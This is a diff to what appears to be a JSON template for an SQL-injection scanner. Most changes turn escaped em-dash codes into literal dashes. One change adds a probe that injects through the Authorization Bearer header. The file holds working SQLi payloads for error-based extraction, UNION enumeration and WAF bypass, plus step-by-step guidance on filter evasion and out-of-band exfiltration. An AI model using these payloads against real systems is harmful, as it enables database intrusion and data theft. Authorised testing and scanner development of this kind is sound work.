@@ -28,7 +28,7 @@
       "probes": [
         {
           "payload": "{{baseline}} AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))-- -",
-          "description": "MySQL EXTRACTVALUE error-based extraction \u2014 XPATH syntax error leaks version() output",
+          "description": "MySQL EXTRACTVALUE error-based extraction — XPATH syntax error leaks version() output",
           "matchers": [
             {
               "type": "word",
@@ -45,7 +45,7 @@
         },
         {
           "payload": "{{baseline}} AND UPDATEXML(1,CONCAT(0x7e,(SELECT user())),1)-- -",
-          "description": "MySQL UPDATEXML error-based extraction \u2014 XPATH syntax error leaks current DB user",
+          "description": "MySQL UPDATEXML error-based extraction — XPATH syntax error leaks current DB user",
           "matchers": [
             {
               "type": "word",
@@ -80,7 +80,7 @@
       ]
     },
     "union_detect": {
-      "description": "UNION-based column count enumeration \u2014 determines number of columns by incrementing NULLs until query succeeds",
+      "description": "UNION-based column count enumeration — determines number of columns by incrementing NULLs until query succeeds",
       "tech_match": [],
       "param_match": [
         "id",
@@ -98,7 +98,7 @@
       "probes": [
         {
           "payload": "{{baseline}} UNION SELECT NULL-- -",
-          "description": "Single-column UNION probe \u2014 status 200 or length diff indicates correct column count",
+          "description": "Single-column UNION probe — status 200 or length diff indicates correct column count",
           "matchers": [
             {
               "type": "status",
@@ -117,7 +117,7 @@
         },
         {
           "payload": "{{baseline}} UNION SELECT NULL,NULL-- -",
-          "description": "Two-column UNION probe \u2014 status 200 or length diff indicates correct column count",
+          "description": "Two-column UNION probe — status 200 or length diff indicates correct column count",
           "matchers": [
             {
               "type": "status",
@@ -136,7 +136,7 @@
         },
         {
           "payload": "{{baseline}} UNION SELECT NULL,NULL,NULL-- -",
-          "description": "Three-column UNION probe \u2014 status 200 or length diff indicates correct column count",
+          "description": "Three-column UNION probe — status 200 or length diff indicates correct column count",
           "matchers": [
             {
               "type": "status",
@@ -155,7 +155,7 @@
         },
         {
           "payload": "{{baseline}} ORDER BY 10-- -",
-          "description": "ORDER BY out-of-range column \u2014 500 error confirms fewer than 10 columns, revealing max column count",
+          "description": "ORDER BY out-of-range column — 500 error confirms fewer than 10 columns, revealing max column count",
           "matchers": [
             {
               "type": "status",
@@ -189,7 +189,7 @@
       "probes": [
         {
           "payload": "{{baseline}}'",
-          "description": "Quote break to trigger generic SQL error \u2014 500 alone is weak; combined with SQL-related error keywords for higher confidence",
+          "description": "Quote break to trigger generic SQL error — 500 alone is weak; combined with SQL-related error keywords for higher confidence",
           "matchers": [
             {
               "type": "status",
@@ -241,7 +241,7 @@
       ]
     },
     "waf_bypass": {
-      "description": "WAF bypass SQL injection payloads \u2014 MySQL version comments, URL-encoded keywords from HackTricks",
+      "description": "WAF bypass SQL injection payloads — MySQL version comments, URL-encoded keywords from HackTricks",
       "tech_match": [
         "MySQL",
         "Apache",
@@ -263,7 +263,7 @@
       "probes": [
         {
           "payload": "{{baseline}}/*!50000UNION*//*!50000SELECT*/NULL-- -",
-          "description": "MySQL conditional version comment bypass \u2014 inline comments hide UNION/SELECT from WAF keyword matching",
+          "description": "MySQL conditional version comment bypass — inline comments hide UNION/SELECT from WAF keyword matching",
           "matchers": [
             {
               "type": "status",
@@ -301,7 +301,7 @@
         },
         {
           "payload": "{{baseline}}'/**/UNION/**/SELECT/**/NULL-- -",
-          "description": "Comment-padded UNION SELECT \u2014 C-style comments break keyword detection in many WAF implementations",
+          "description": "Comment-padded UNION SELECT — C-style comments break keyword detection in many WAF implementations",
           "matchers": [
             {
               "type": "status",
@@ -319,15 +319,47 @@
           "variables": {}
         }
       ]
+    },
+    "auth_header_injection": {
+      "description": "SQLi via Authorization header. Many auth middleware concatenate Bearer-strip output into LIKE query without sanitisation.",
+      "tech_match": [],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "Bearer AAAAAA'or'1'='1",
+          "description": "Authorization: Bearer with single-quote escape — confirms via error reflection",
+          "matchers": [
+            {
+              "type": "regex",
+              "pattern": "(?i)(SQL syntax|ORA-\\d{5}|syntax error at or near|near \\\")"
+            },
+            {
+              "type": "status",
+              "status": [
+                500,
+                200
+              ]
+            }
+          ],
+          "severity": "critical",
+          "confidence_boost": 75,
+          "variables": {
+            "header_inject": {
+              "Authorization": "Bearer AAAAAA'or'1'='1"
+            },
+            "manual_chain": true
+          }
+        }
+      ]
     }
   },
   "craft_guidance": [
     "1. IDENTIFY CONTEXT: Determine if input lands in WHERE clause, ORDER BY, INSERT VALUES, or LIMIT. Each needs different break characters.",
-    "2. DETECT DB ENGINE: Use vendor-specific errors or functions \u2014 @@version (MSSQL), version() (MySQL/PG), sqlite_version() (SQLite), banner (Oracle).",
+    "2. DETECT DB ENGINE: Use vendor-specific errors or functions — @@version (MSSQL), version() (MySQL/PG), sqlite_version() (SQLite), banner (Oracle).",
     "3. CHOOSE TECHNIQUE by visibility: Error-based (fastest) > UNION (data extraction) > Boolean blind (slow but reliable) > Time-based (last resort) > OOB DNS (when no output at all).",
     "4. UNION EXPLOITATION: Find column count with ORDER BY N (increment until error), then UNION SELECT NULL,NULL,...,NULL to match. Replace NULLs one-by-one with data extraction functions.",
     "5. BLIND EXTRACTION: Use SUBSTRING(value,pos,1) with binary search on ASCII values. For time-based, calibrate delay against baseline latency (+2s minimum delta).",
-    "6. WAF BYPASS CHAIN: Try in order \u2014 inline comments (/*!50000 SELECT*/), case variation (sElEcT), whitespace alternatives (/**/ or %0a), double encoding (%2527), concat char-by-char (CHAR(83)+CHAR(69)...).",
+    "6. WAF BYPASS CHAIN: Try in order — inline comments (/*!50000 SELECT*/), case variation (sElEcT), whitespace alternatives (/**/ or %0a), double encoding (%2527), concat char-by-char (CHAR(83)+CHAR(69)...).",
     "7. FILTER EVASION: If quotes blocked, use hex (0x61646D696E), CHAR(), or numeric comparison. If spaces blocked, use /**/ or %09 (tab). If keywords blocked, use synonyms (COALESCE vs IF, CASE vs IIF).",
     "8. OOB EXFILTRATION: MySQL LOAD_FILE+INTO OUTFILE, MSSQL xp_dirtree/xp_fileexist to UNC path, PostgreSQL COPY TO PROGRAM, Oracle UTL_HTTP.REQUEST."
   ]
